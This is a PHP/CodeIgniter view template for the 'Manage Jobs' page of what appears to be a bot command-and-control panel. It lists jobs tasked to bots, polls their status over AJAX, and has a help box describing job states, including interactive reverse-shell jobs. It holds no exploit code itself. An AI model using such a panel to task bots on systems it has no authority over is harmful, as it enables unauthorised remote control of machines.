<?php //include('includes/header.php'); ?>

  <!-- Start Breadcrumbs -->
  <div class="header-bottom">
    <ul id="breadcrumbs">
      <li><a href="<?php echo base_url(); ?>login/manage">Dashboard</a> &raquo;</li>
      <li><a href="<?php echo base_url(); ?>/login/managejobs">Manage Jobs</a></li>
    </ul>
  </div>
  <!-- End Breadcrumbs -->

</div>


<!-- start page header -->
<div id="page-wrapper">
  <div class="page">

<?php include('includes/sidebar.php'); ?>

    <!-- Star Page Content  -->
    <div id="page-content">

      <!-- Start Page Header -->
      <div id="page-header">
        <h1>Manage Jobs</h1>
      </div>
      <!-- End Page Header -->

      <!-- Start Grid -->
      <div class="container_12">






        <!-- Start Table -->
        <?php if ($help == 0): ?>
            <div class="grid_12">
        <?php endif; ?>
        <?php if ($help == 1): ?>
            <div class="grid_8">
        <?php endif; ?>
        <?php echo $this->session->flashdata('messages'); ?>
                
        <?php if ($help == 1): ?>
            <div class="notification tip"> <span class="strong">TIP:</span> Click <a href="<?php echo base_url(); ?>login/addjob">HERE</a> to add a new job </div>
        <?php endif; ?>
        
        
        <div class="box-header"> Manage </div>
          <div class="box">
            <form method="post" action="<?php echo base_url(); ?>login/delJobs ">
              <div class="row">
                <label>Jobs: </label>
               <input type="submit" value="Clear All Jobs" class="button" onclick="return confirm('Are you sure you want to clear all jobs?')" />
               <input type="hidden" id="token" name="token" value="<?php echo $token; ?>" />
              </div>                  
            </form>
          </div>        
        
          <div class="box-header"> All Jobs </div>
          <div class="box table">
            <table cellspacing="0">
              <thead>
                <tr>
                  <td>Date</td>
                  <td>Job Name</td>
                  <td>Bot</td>
                  <td>Status</td>
                  <td>Actions</td>
                </tr>
              </thead>
              <tbody>
              <?php $cnt = 0; ?>
                  
                  
              <?php foreach($job_data->result() as $job): ?>
                <tr>
                  <td> <?php $time = strtotime($job->job_date); echo date('m/d/y g:i:s A', $time); ?> </td>
                  <td> <?php echo $job->job_name; ?> </td>
                  <td> <?php echo $this->bot_model->getBotName($job->job_botkey); ?> </td>
                  
                      <script type="text/javascript">
                           var refreshId4 = setInterval(function() {
                       }, 2000);
                      </script>
                
                  
                  <td class="tc" id="responsecontainer_<?php $cnt = $cnt +1; echo $cnt; ?>">
                      <div align="center"><img src="<?php echo base_url().'img/icons/small/loading.gif'; ?>" alt="Loading..." title="Loading..." /></div>
                      <script type="text/javascript">
                           var refreshId1 = setInterval(function() {
                          $("#responsecontainer_<?php echo $cnt; ?>").load('ajaxstatus/<?php echo $job->job_id; ?>');
                       }, 2000);
                       
                      </script>
                </td>  
                
                  <td class="tc" id="responseholder_<?php echo $cnt; ?>">
                      <div align="center"><img src="<?php echo base_url().'img/icons/small/loading.gif'; ?>" alt="Loading..." title="Loading..." /></div>
                      <script type="text/javascript">
                           var refreshId2 = setInterval(function() {
                          $("#responseholder_<?php echo $cnt; ?>").load('ajaxactions/<?php echo $job->job_id; ?>');
                       }, 2000);
                      </script>
                </td>                 
                </tr>
                <?php endforeach;?>
                
                
                
              </tbody>
            </table>
          </div>
          <?php echo $this->pagination->create_links(); ?>

          
        </div>
        <!-- End Table -->
        
















<?php if ($help == 1): ?>
        <!-- Start Formatting -->
        <div class="grid_4">
          <div class="box-header"> Quick View </div>
          <div class="box">
            <h2>Manage Jobs</h2>
            <p>  This is a table listing of all Jobs and their current status. For a list of allowable actions, please see the Action column.<br><br><b>Pending...</b> = this indicates that a Job is waiting to be retrieved by the Bot.<br><br><b>Running Job...</b> = Job has been retrieved by the Bot and is in the process of execution.<br><br><b>Output Received</b> = Output is ready for analysis.<br><br><b>Interactive Job Initiated</b> = An interactive job (ie: Reverse Shell) has been retrieved by the Bot and is in the process of execution.<br><br><b>Output Saved to Bot</b> = The job has executed and the output will be saved to a local file on the bot only.</p>
          </div>
        </div>
<?php endif; ?>
       
        <br class="cl" />
        <!-- End Formatting -->















        <!-- End Grid -->
      </div>
      <!-- End Page Wrapper -->
    </div>
    <!-- End Page Content  -->
  </div>
</div>

<?php include('includes/footer.php'); ?>